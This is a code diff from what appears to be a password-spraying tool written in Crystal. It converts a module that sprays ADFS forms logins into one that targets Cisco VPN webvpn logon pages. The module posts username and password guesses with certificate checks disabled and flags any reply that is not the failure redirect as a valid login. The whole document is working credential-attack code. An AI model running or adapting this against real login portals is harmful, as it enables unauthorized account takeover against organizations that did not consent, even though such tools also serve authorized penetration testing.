@@ -1,13 +1,12 @@
 require "http/client"
 
-class ADFS_forms < Sprayer
-    property domain : String
+class Cisco_VPN < Sprayer
+
     ## only uncomment if needed
-    def initialize(usernames : Array(String), password : Array(String) )
-        # init any special or default variables here
-        super
-        @domain = "WORKGROUP"
-    end
+    # def initialize(usernames : Array(String), password : Array(String))
+    #     # init any special or default variables here
+    #     super()
+    # end
 
     # returns an array of [username, password, valid, lockout, mfa]
     def spray(username : String, password : String) 
@@ -18,11 +17,10 @@ class ADFS_forms < Sprayer
         # 
         # YOUR CODE BELOW 
         #
-        path = "/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=cbcxt=&username=&mkt=&lc="
-        
 
+        path = "/+webvpn+/index.html"
         # some basic setups for web based auth 
-        url = URI.parse "#{@target}#{path}" 
+        url = URI.parse @target
         #gotta set no verify for tls pages
         context = OpenSSL::SSL::Context::Client.new
         context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
@@ -36,14 +34,17 @@ class ADFS_forms < Sprayer
             "Accept-Encoding" => "gzip, deflate",
             "Content-Type" => "application/x-www-form-urlencoded",
         }
-        form = "UserName=#{URI.encode_www_form(@domain)}%5C#{URI.encode_www_form(username)}&Password=#{ URI.encode_www_form(password) }&AuthMethod=FormsAuthentication"
+        form = "tgroup=&next=&tgcookieset=&username=#{URI.encode_www_form(username)}&password=#{URI.encode_www_form(password)}&Login=Login"
         
         # here is the basic 
         page = client.post(path, headers: header, form: form)
+        # p page.body
 
-        if page.status_code == 302
+        if page.status_code == 200 && page.body != "<html>\n<head>\n<script>\ndocument.location.replace(\"/+CSCOE+/logon.html?\"+\n\"a0=8\"+\n\"&a1=\"+\n\"&a2=\"+\n\"&a3=1\");\n</script>\n</head>\n</html>\n\n\n"
             valid = true 
         end
+
+
 
 
         #
